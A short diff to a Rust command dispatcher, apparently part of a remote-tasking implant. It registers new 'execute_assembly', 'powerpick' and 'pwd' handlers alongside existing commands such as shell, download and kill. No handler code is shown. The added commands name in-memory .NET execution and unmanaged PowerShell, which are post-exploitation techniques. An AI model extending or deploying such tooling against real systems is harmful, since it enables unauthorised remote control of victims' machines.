@@ -8,6 +8,8 @@ mod cp;
 mod download;
 #[path = "commands/env.rs"]
 mod env;
+#[path = "commands/execute_assembly.rs"]
+mod execute_assembly;
 #[path = "commands/exit.rs"]
 mod exit;
 #[path = "commands/kill.rs"]
@@ -20,8 +22,12 @@ mod mkdir;
 mod mv;
 #[path = "commands/netstat.rs"]
 mod netstat;
+#[path = "commands/powerpick.rs"]
+mod powerpick;
 #[path = "commands/ps.rs"]
 mod ps;
+#[path = "commands/pwd.rs"]
+mod pwd;
 #[path = "commands/resolve.rs"]
 mod resolve;
 #[path = "commands/rm.rs"]
@@ -49,13 +55,16 @@ pub fn dispatch(task: &TaskMessage) -> TaskResponse {
         "cp" => cp::handle(task),
         "download" => download::handle(task),
         "env" => env::handle(task),
+        "execute_assembly" | "executeAssembly" => execute_assembly::handle(task),
         "exit" => exit::handle(task),
         "kill" => kill::handle(task),
         "ls" => ls::handle(task),
         "mkdir" => mkdir::handle(task),
         "mv" => mv::handle(task),
         "netstat" => netstat::handle(task),
+        "powerpick" | "PowerPick" => powerpick::handle(task),
         "ps" => ps::handle(task),
+        "pwd" => pwd::handle(task),
         "resolve" => resolve::handle(task),
         "rm" => rm::handle(task),
         "shell" => shell::handle(task),
